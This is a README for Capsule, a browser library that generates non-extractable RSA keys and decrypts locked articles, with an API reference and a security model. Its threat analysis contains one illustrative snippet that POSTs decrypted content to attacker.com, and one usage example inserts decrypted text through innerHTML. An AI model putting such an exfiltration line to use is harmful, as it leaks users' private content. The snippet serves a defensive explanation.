# Capsule Client Library

Browser-side decryption library for the Capsule secure article-locking system.

## Features

- **Secure Key Generation**: RSA-OAEP (2048 or 4096-bit) key pairs generated in the browser
- **Non-extractable Private Keys**: Private keys stored with `extractable: false` in IndexedDB
- **Web Crypto API**: Uses native browser cryptography for maximum security
- **Promise-based IndexedDB**: Uses the `idb` library for easy key persistence
- **Multi-key Support**: Manage multiple keys with different identifiers (tier-based, article-specific, etc.)

## Installation

```bash
npm install @sesamy/capsule
```

## Usage

### Initialize the Client

```typescript
import { CapsuleClient } from "capsule-client";

// Default client (single key)
const client = new CapsuleClient();

// Multi-key scenario (e.g., tier-based or article-specific keys)
const premiumClient = new CapsuleClient({ keyId: "premium-tier" });
const articleClient = new CapsuleClient({ keyId: "article-123" });
```

### Generate and Store Keys (First Time Setup)

```typescript
// Generate a new RSA key pair and store in IndexedDB
const publicKeyB64 = await client.generateKeyPair();

// Send publicKeyB64 to your server for registration
await fetch("/api/register-key", {
  method: "POST",
  body: JSON.stringify({ publicKey: publicKeyB64 }),
  headers: { "Content-Type": "application/json" },
});
```

### Check for Existing Keys

```typescript
const hasKeys = await client.hasKeyPair();

if (!hasKeys) {
  // Need to generate keys
  const publicKey = await client.generateKeyPair();
  // ... register with server
}
```

### Export Public Key (if needed later)

```typescript
const publicKeyB64 = await client.getPublicKey();
```

### Decrypt an Article

```typescript
// Fetch encrypted payload from server
const response = await fetch("/api/article/123");
const encryptedPayload = await response.json();

// Decrypt using the stored private key
const articleContent = await client.decryptArticle(encryptedPayload);

// Display the decrypted content
document.getElementById("article").textContent = articleContent;
```

### Full Example

```typescript
import { CapsuleClient } from "capsule-client";

const client = new CapsuleClient();

async function setupEncryption() {
  // Check if we already have keys
  const hasKeys = await client.hasKeyPair();

  if (!hasKeys) {
    // Generate new key pair
    const publicKey = await client.generateKeyPair();

    // Register public key with server
    await fetch("/api/user/public-key", {
      method: "POST",
      body: JSON.stringify({ publicKey }),
      headers: { "Content-Type": "application/json" },
    });
  }
}

async function readArticle(articleId: string) {
  // Fetch encrypted article
  const response = await fetch(`/api/articles/${articleId}`);
  const payload = await response.json();

  // Decrypt and display
  try {
    const content = await client.decryptArticle(payload);
    document.getElementById("article-content").innerHTML = content;
  } catch (error) {
    console.error("Failed to decrypt article:", error);
    // Handle decryption failure (e.g., key mismatch)
  }
}

// Initialize on page load
setupEncryption();
```

## API Reference

### `CapsuleClient`

The main client class for key management and decryption.

#### Constructor

```typescript
new CapsuleClient(options?: CapsuleClientOptions)
```

Options:

- `keySize`: RSA key size in bits (default: 2048, can be 4096)
- `dbName`: IndexedDB database name (default: 'capsule-keys')
- `storeName`: IndexedDB store name (default: 'keypair')
- `keyId`: Key identifier for multi-key scenarios (default: 'default')

#### Methods

##### `generateKeyPair(): Promise<string>`

Generate a new RSA-OAEP key pair and store in IndexedDB.

Returns the Base64-encoded SPKI public key to send to the server.

##### `hasKeyPair(): Promise<boolean>`

Check if a key pair exists in IndexedDB.

##### `getPublicKey(): Promise<string>`

Get the Base64-encoded public key (if stored).

##### `decryptArticle(payload: EncryptedPayload): Promise<string>`

Decrypt an encrypted article payload.

##### `decryptContent(payload: EncryptedPayload): Promise<ArrayBuffer>`

Decrypt content and return raw bytes.

##### `clearKeys(): Promise<void>`

Delete all stored keys from IndexedDB.

### `EncryptedPayload`

```typescript
interface EncryptedPayload {
  encryptedContent: string; // Base64
  iv: string; // Base64
  encryptedDek: string; // Base64
}
```

## Security Model

### Private Key Protection: The Core Security Guarantee

The Capsule client's security is built on a fundamental principle: **the private key cannot be extracted from the browser**, even by the user themselves or malicious JavaScript code.

#### How Non-Extractable Keys Work

When generating a key pair, the private key is stored with `extractable: false`:

```typescript
const privateKey = await crypto.subtle.importKey(
  "jwk",
  privateKeyJwk,
  { name: "RSA-OAEP", hash: "SHA-256" },
  false, // NOT extractable - this is enforced at the browser engine level
  ["unwrapKey"]
);
```

This means:

- ✅ **The key can be used** for cryptographic operations (unwrapping DEKs)
- ❌ **The key cannot be exported** in any format (JWK, PKCS8, raw bytes)
- ❌ **The key cannot be copied** to another device or browser
- ❌ **The key cannot be downloaded** or sent to a server

#### What About IndexedDB Access?

Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:

```javascript
// This works - you can retrieve the key object
const db = await indexedDB.open("capsule-keys");
const keyPair = await db.get("keypair", "default");
console.log(keyPair.privateKey);
// Output: CryptoKey {type: "private", extractable: false, ...}

// But this FAILS - you cannot export the key material
await crypto.subtle.exportKey("jwk", keyPair.privateKey);
// Error: "key is not extractable"
```

The `CryptoKey` object stored in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.

#### Attack Vector Analysis

| Attack Type                   | Can Extract Private Key? | Notes                                            |
| ----------------------------- | ------------------------ | ------------------------------------------------ |
| Server compromise             | ❌ No                    | Key never sent to server                         |
| Network interception          | ❌ No                    | Key never transmitted                            |
| XSS/malicious JavaScript      | ❌ No                    | Can _use_ key, but cannot _export_ it            |
| Browser DevTools access       | ❌ No                    | Can see key object, but not key bytes            |
| Database breach               | ❌ No                    | No server-side key storage                       |
| User attempting manual export | ❌ No                    | `extractable: false` prevents all export methods |

The **only** attack that works is using the key for its intended purpose:

```javascript
// Malicious code CAN do this:
const decryptedContent = await client.decryptArticle(payload);
await fetch("https://attacker.com", {
  method: "POST",
  body: decryptedContent, // Send decrypted content (not the key!)
});
```

This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.

### Public vs Private Key: Why Different Extractability?

The key pair has different extractability settings for important reasons:

- **Public Key**: `extractable: true`
  - Must be exported to SPKI format and sent to the server
  - Safe to share - it can only _encrypt_, not _decrypt_
  - Server uses it to wrap DEKs before sending to client
- **Private Key**: `extractable: false`
  - Must stay locked in the browser's crypto engine
  - Can only be used for unwrapping DEKs, never exported
  - Guarantees end-to-end encryption - server never has decrypt capability

### Additional Security Layers

1. **DEKs in Memory Only**: Unwrapped DEKs are cached in JavaScript memory (not persisted) and lost on page refresh
2. **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
3. **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
4. **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
5. **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys

### What This Means for Your Application

✅ **Server compromise cannot leak user keys** - They're not on the server  
✅ **Database breach cannot decrypt content** - Private keys are client-side only  
✅ **Network eavesdropping is ineffective** - Only wrapped DEKs are transmitted  
✅ **Users cannot accidentally export their keys** - Browser prevents it  
✅ **True end-to-end encryption** - Only the user's browser can decrypt

### Limitations and Trade-offs

⚠️ **Key loss means data loss**: If a user clears browser data or switches devices, they lose access  
⚠️ **No cross-device sync**: Keys are tied to a single browser profile  
⚠️ **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)

Consider implementing:

- Server-side encrypted key backup (wrapped with user password)
- Multi-device key synchronization (using secure key exchange protocols)
- Content Security Policy (CSP) to prevent XSS attacks

## Browser Compatibility

Requires browsers with Web Crypto API support:

- Chrome 37+
- Firefox 34+
- Safari 11+
- Edge 12+

## Development

```bash
npm install
npm run build
npm test
```

## License

MIT
